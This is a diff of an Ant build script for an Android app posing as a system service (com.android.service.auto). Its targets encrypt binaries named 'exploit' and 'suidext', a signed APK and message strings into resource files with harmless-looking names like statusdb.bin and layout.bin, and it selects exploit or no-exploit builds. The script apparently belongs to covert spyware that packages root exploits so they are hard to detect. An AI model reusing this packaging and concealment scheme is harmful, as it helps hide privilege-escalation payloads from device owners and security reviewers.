@@ -54,28 +54,43 @@
 			<pathelement path="${basedir}/../ant-libs/crypter-ant-1.0.0/lib/crypter-ant.jar" />
 		</classpath>
 	</taskdef>
-			
+
 	<target name="encrypt-messages">
-		<delete file="res/raw/messages.bin" />	
+		<delete file="res/raw/messages.bin" />
 		<crypter encrypt="true" keyFile="0x5A3D00448D7A912B" inputFile="preprocess/messages.properties.all" outputFile="res/raw/messages.bin" />
 	</target>
-	
+
 	<target name="encrypt-manifest">
-		<delete file="res/raw/layout.bin" />	
+		<delete file="res/raw/layout.bin" />
 		<crypter encrypt="true" keyFile="0xA83E0F44BD7A4D20" inputFile="preprocess/ManifestSigned.apk" outputFile="res/raw/layout.bin" />
 	</target>
-			
+
 	<target name="encrypt-exploit">
-		<delete file="res/raw/statusdb.bin" />	
+		<delete file="res/raw/statusdb.bin" />
 		<delete file="res/raw/statuslog.bin" />
 		<crypter encrypt="true" keyFile="0x5A3D10448D7A912A" inputFile="libs/armeabi/suidext" outputFile="res/raw/statusdb.bin" />
 		<crypter encrypt="true" keyFile="0x5A3D10448D7A912B" inputFile="libs/armeabi/exploit" outputFile="res/raw/statuslog.bin" />
 	</target>
-	
-	<target name="libs" depends="encrypt-messages, encrypt-exploit, encrypt-manifest">
+
+	<target name="encrypt-noexploit">
+		<delete file="res/raw/statusdb.bin" />
+		<delete file="res/raw/statuslog.bin" />
+		<touch file="res/raw/statusdb.bin" />
+		<touch file="res/raw/statuslog.bin" />
 	</target>
-		
-	<target name="set-debug" depends="libs">
+
+	<target name="encrypt-nomanifest">
+		<delete file="res/raw/layout.bin" />
+		<touch file="res/raw/layout.bin" />
+	</target>
+
+	<target name="libsnoexp" depends="encrypt-messages, encrypt-noexploit, encrypt-nomanifest">
+	</target>
+
+	<target name="libsexp" depends="encrypt-messages, encrypt-exploit, encrypt-manifest">
+	</target>
+
+	<target name="set-debug" depends="libsnoexp">
 		<echo message="********** Set debug mode *********" />
 		<copy file="preprocess/AndroidManifest.xml" todir="." overwrite="true">
 			<filterset>
@@ -86,7 +101,7 @@
 		<copy file="preprocess/Cfg.java" toFile="src/com/android/service/auto/Cfg.java" overwrite="true">
 			<filterset>
 				<filter token="DEBUG" value="true" />
-				<filter token="EXPLOIT" value="true" />
+				<filter token="EXPLOIT" value="false" />
 				<filter token="DEMO" value="true" />
 			</filterset>
 		</copy>
@@ -96,7 +111,7 @@
 		<delete file="assets/statusdb" />
 	</target>
 
-	<target name="set-release"  depends="encrypt-messages">
+	<target name="set-release" depends="encrypt-messages">
 		<echo message="******** Set release mode **********" />
 		<copy file="preprocess/AndroidManifest.xml" todir="." overwrite="true">
 			<filterset>
@@ -117,7 +132,7 @@
 		<delete file="assets/statusdb" />
 	</target>
 
-	<target name="set-demo"  depends="encrypt-messages">
+	<target name="set-demo" depends="encrypt-messages">
 		<echo message="******** Set demo  mode **********" />
 		<copy file="preprocess/AndroidManifest.xml" todir="." overwrite="true">
 			<filterset>
@@ -138,7 +153,7 @@
 		<delete file="assets/statusdb" />
 	</target>
 
-	<target name="set-exploit"  depends="encrypt-messages">
+	<target name="set-exploit" depends="encrypt-messages">
 		<echo message="******** Set exploit mode **********" />
 		<copy file="preprocess/AndroidManifest.xml" todir="." overwrite="true">
 			<filterset>
@@ -227,7 +242,7 @@
 
 	<setup />
 
-	<!-- Che c'e', Quez, ti da errore qui? E' normale. L'unico modo per liberarsene e':
+	<!-- Che c'e', ti da errore qui? E' normale. L'unico modo per liberarsene e':
 	 Go to Window->preferences->Ant->Problems tab. Add "build.xml" to the ignore list
 	 -->
 
